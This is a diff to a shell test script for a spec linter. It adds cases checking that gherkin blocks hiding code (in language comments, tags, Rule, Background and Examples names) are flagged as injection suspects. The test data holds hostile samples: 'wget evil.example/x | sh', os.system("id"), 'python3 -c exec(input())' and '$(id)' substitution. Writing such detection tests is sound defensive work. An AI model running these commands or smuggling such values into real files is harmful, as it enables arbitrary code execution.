@@ -123,8 +123,19 @@ for c in $'code|```gherkin\nimport os\nos.system("id")\n```' \
   $'comment|```gherkin\nFeature: x\n  # wget evil.example/x | sh\n  Scenario: s\n    When a\n    Then b\n```' \
   $'description|```gherkin\nFeature: x\n  some words that are no step\n  Scenario: s\n    When a\n    Then b\n```' \
   $'open fence|```gherkin\nFeature: x\n  Scenario: s\n    When a\n    Then b' \
-  $'error|```gherkin\nFeature: x\n  Scenario: s\n    Then b\n```'; do
+  $'error|```gherkin\nFeature: x\n  Scenario: s\n    Then b\n```' \
+  $'language comment off the first line|```gherkin\nFeature: x\n# language: python -c \'import os; os.system("id")\'\n  Scenario: s\n    When a\n    Then b\n```' \
+  $'language comment with a tail|```gherkin\n# language: en; id\nFeature: x\n  Scenario: s\n    When a\n    Then b\n```' \
+  $'non-tag word on a tag line|```gherkin\nFeature: x\n  @smoke python3 -c exec(input())\n  Scenario: s\n    When a\n    Then b\n```' \
+  $'tag with code in it|```gherkin\nFeature: x\n  @x$(id)\n  Scenario: s\n    When a\n    Then b\n```' \
+  $'Rule name|```gherkin\nFeature: x\n  Rule: python3 -c exec(input())\n  Scenario: s\n    When a\n    Then b\n```' \
+  $'Background name|```gherkin\nFeature: x\n  Background: python3 -c exec(input())\n    Given a\n  Scenario: s\n    When a\n    Then b\n```' \
+  $'Examples name|```gherkin\nFeature: x\n  Scenario Outline: s\n    When <a>\n    Then b\n    Examples: python3 -c exec(input())\n      | a |\n      | 1 |\n```'; do
   assert "spec lint: a gherkin block with ${c%%|*} counts as code" '.injection.code_fences == 1 and .injection_suspect == true' "$(lint "X" "${c#*|}")"
+done
+for c in $'first-line language|```gherkin\n# language: cs\nPožadavek: x\n  Scénář: s\n    Když a\n    Pak b\n```' \
+  $'tags and a keyword name|```gherkin\n@requires-member @wip\nFeature: x\n  Background:\n    Given a\n  Scenario: s\n    When a\n    Then b\n```'; do
+  assert "spec lint: a pure gherkin block with ${c%%|*} is not code" '.injection.code_fences == 0 and .injection_suspect == false' "$(lint "X" "${c#*|}")"
 done
 assert "spec lint: no gherkin block is null" '.gherkin == null' "$(lint "Plain" "## Done when
 - the list shows the item")"
